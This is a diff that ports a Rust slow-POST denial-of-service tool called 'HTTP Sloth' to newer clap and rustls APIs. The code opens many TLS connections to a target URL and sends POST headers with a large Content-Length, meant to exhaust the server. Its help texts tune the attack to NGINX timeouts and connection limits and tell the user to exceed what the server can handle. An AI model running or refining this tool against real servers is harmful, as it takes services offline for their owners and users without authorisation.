@@ -6,9 +6,8 @@ use std::sync::Arc;
 use std::thread::sleep;
 use std::time::Duration;
 
-#[macro_use]
 extern crate clap;
-use clap::{App, Arg};
+use clap::{Arg, Command};
 
 #[macro_use]
 extern crate log;
@@ -18,8 +17,7 @@ use tokio::net::TcpStream;
 use tokio::time;
 
 use tokio_rustls::{
-    rustls::ClientConfig, rustls::OwnedTrustAnchor, rustls::RootCertStore, rustls::ServerName,
-    TlsConnector,
+    rustls::pki_types::ServerName, rustls::ClientConfig, rustls::RootCertStore, TlsConnector,
 };
 
 use url::Url;
@@ -29,33 +27,36 @@ async fn main() -> io::Result<()> {
     std::env::set_var("RUST_LOG", "info");
     env_logger::init();
 
-    let arguments = App::new("HTTP Sloth")
-        .arg(Arg::with_name("url")
+    let arguments = Command::new("HTTP Sloth")
+        .arg(Arg::new("url")
              .long("url")
              .value_name("URL")
              .help("Target URL.")
              .required(true))
-        .arg(Arg::with_name("content-length")
+        .arg(Arg::new("content-length")
              .long("content-length")
              .value_name("BYTES")
              .help("Content-Length request header. Must be less than client_max_body_size (NGINX)"))
-        .arg(Arg::with_name("interval")
+        .arg(Arg::new("interval")
              .value_name("SECONDS")
              .long("interval")
              .help("Byte to byte interval. Should be less than server's client_body_timeout (NGINX) value."))
-        .arg(Arg::with_name("max-connections")
-             .value_name("INTEGER")
+        .arg(Arg::new("max-connections")
              .long("max-connections")
+             .value_name("INTEGER")
              .help("Higher cap for simultaneously opened connections. Should be more than server can handle (1024 NGINX default)."))
         .get_matches();
 
-    let parsed_url = Url::parse(arguments.value_of("url").unwrap()).unwrap();
+    let parsed_url = Url::parse(arguments.get_one::<String>("url").unwrap()).unwrap();
     let host = parsed_url.host_str().unwrap().to_owned();
     let path = parsed_url.path();
-    let content_length = value_t!(arguments, "content-length", u32).unwrap_or(50_000);
-    let tick = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
-    let max_connections_count: usize =
-        value_t!(arguments, "max-connections", usize).unwrap_or(32768);
+    let content_length = *arguments
+        .get_one::<u32>("content-length")
+        .unwrap_or(&50_000);
+    let tick = Duration::from_secs(*arguments.get_one::<u64>("interval").unwrap_or(&50));
+    let max_connections_count: usize = *arguments
+        .get_one::<usize>("max-connections")
+        .unwrap_or(&32768);
     let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, &host, content_length);
     let addr = format!(
         "{}:{}",
@@ -67,21 +68,16 @@ async fn main() -> io::Result<()> {
     .next()
     .unwrap();
 
-    let tls_connector: TlsConnector = {
-        let mut root_store = RootCertStore::empty();
-        root_store.add_server_trust_anchors(webpki_roots::TLS_SERVER_ROOTS.0.iter().map(|ta| {
-            OwnedTrustAnchor::from_subject_spki_name_constraints(
-                ta.subject,
-                ta.spki,
-                ta.name_constraints,
-            )
-        }));
-        let config = ClientConfig::builder()
-            .with_safe_defaults()
-            .with_root_certificates(root_store)
-            .with_no_client_auth();
-        Arc::new(config).into()
-    };
+    let mut root_store = RootCertStore::empty();
+
+    root_store.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
+
+    let config = ClientConfig::builder()
+        .with_root_certificates(root_store)
+        .with_no_client_auth();
+
+    let tls_connector: TlsConnector = Arc::new(config).into();
+
     let live_connections = Arc::new(AtomicUsize::new(0));
 
     {
@@ -122,7 +118,7 @@ async fn main() -> io::Result<()> {
             })?;
 
             let mut connection = tls_connector
-                .connect(ServerName::try_from(host.as_ref()).unwrap(), socket)
+                .connect(ServerName::try_from(host).unwrap(), socket)
                 .await
                 .map_err(|e| {
                     live_connections.fetch_sub(1, Ordering::SeqCst);
